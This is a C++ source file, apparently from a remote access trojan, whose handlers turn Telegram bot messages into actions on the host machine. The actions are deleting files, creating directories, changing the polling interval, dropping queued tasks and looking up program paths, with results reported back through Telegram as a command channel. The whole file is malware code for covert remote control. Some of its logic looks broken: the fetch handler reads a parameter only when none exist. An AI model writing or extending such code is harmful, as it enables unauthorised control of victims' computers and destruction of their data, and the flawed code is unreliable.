/*rat_handler/src/handlers.cpp*/
#include "rat/Handler.hpp"
#include "rat/handler/debug.hpp"
#include "rat/system.hpp"

#include <cstdint>
#include <exception>
#include <fmt/chrono.h>
#include <fmt/core.h>
#include <tiny-process-library/process.hpp>
#include <vector>

namespace rat::handler {
#ifdef _WIN32
constexpr char FETCHING_LITERAL[] = "where";
#else
constexpr char FETCHING_LITERAL[] = "which";
#endif

void Handler::parseTelegramMessageToCommand() {
	HANDLER_DEBUG_LOG("parsing telegram message into command ");
	std::string message_text = telegram_update->message.text;
	__normalizeWhiteSpaces(message_text);

	auto tokens = splitArguments(message_text);
	if(tokens.empty())
		return;

	const std::string directive = stripQuotes(tokens[0]);

	std::vector<std::string> parameters;
		for(size_t i = 1; i < tokens.size(); ++i) {
			parameters.push_back(stripQuotes(tokens[i]));
		}

	this->command = Command(std::move(directive), std::move(parameters));
}

void Handler::handleResetCommand() {
	this->state = ::rat::handler::RatState();
}

static std::string _deleteFiles(std::vector<std::string> &Files_Paths) {
	std::ostringstream output_stream;

		for(auto it = Files_Paths.begin(); it != Files_Paths.end();) {
				try {
					std::filesystem::remove(*it);
					output_stream << *it << " : was deleted\n";

					it = Files_Paths.erase(it);
				}
				catch(const std::exception &e) {
					output_stream << *it << " : failed to be deleted\n"
					              << e.what() << "\n";
					++it; // move forward if not erased
				}
		}

	return output_stream.str();
}

void Handler::handleCleanCommand() {
	this->bot->sendMessage(_deleteFiles(this->written_files));
		if(this->written_files.capacity() > 15) {
			this->written_files = {};
		}
}

void Handler::handleSetCommand() {
		if(command.parameters.empty()) {
			this->bot->sendMessage("/set <variable> <value>");
			return;
		}

	const std::string &variable = command.parameters[0];
		if(variable == "update_interval") {
				if(command.parameters.size() < 2) {
					this->bot->sendMessage("Missing value for update_interval");
					return;
				}

			uint16_t update_interval = _stringToUint16(command.parameters[1]);
			this->bot->setUpdateIterval(update_interval);
		}
}

void Handler::handleDropCommand() {
		if(!this->command.parameters.empty()) {
			return;
		}

	const uint8_t n_pending_short_processes =
	    this->short_process_pool->getPendingWorkersCount();
	const uint8_t n_pending_long_processes =
	    this->long_process_pool->getPendingWorkersCount();

	this->long_process_pool->dropUnfinished();
	this->short_process_pool->dropUnfinished();

	this->bot->sendMessage(
	    fmt::format("Dropped {} pending short tasks\n{} pending long tasks",
	                n_pending_short_processes, n_pending_long_processes));
}

void Handler::handleFetchCommand() {
	if(!this->command.parameters.empty())
		return;
	const std::string &parameter = this->command.parameters[0];
	//    const auto& user_command_path_map =
	//    this->state.user_defined_command_path_map;

	std::string result;
	const std::string command =
	    fmt::format("{} {}", FETCHING_LITERAL, parameter);
	this->bot->sendMessage(command);
}

void Handler::handleMkdirCommand() {
	const std::vector<std::string> &dirs = this->command.parameters;

	std::ostringstream output_stream;
		for(const auto &dir : dirs) {
				if(std::filesystem::exists(dir)) {
						if(std::filesystem::is_directory(dir)) {
							output_stream << dir << ": already exists\n";
						}
						else {
							output_stream
							    << dir << ": exists but is not a directory\n";
						}
					continue;
				}

				try {
						if(std::filesystem::create_directory(dir)) {
							output_stream << dir << ": created\n";
						}
						else {
							output_stream << dir << ": failed to be created\n";
						}
				}
				catch(const std::filesystem::filesystem_error &e) {
					output_stream << dir << ": error - " << e.what() << "\n";
				}
		}
	this->bot->sendMessage(output_stream.str());
}
} // namespace rat::handler

#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
#undef DEBUG_RAT_HANDLER
#endif
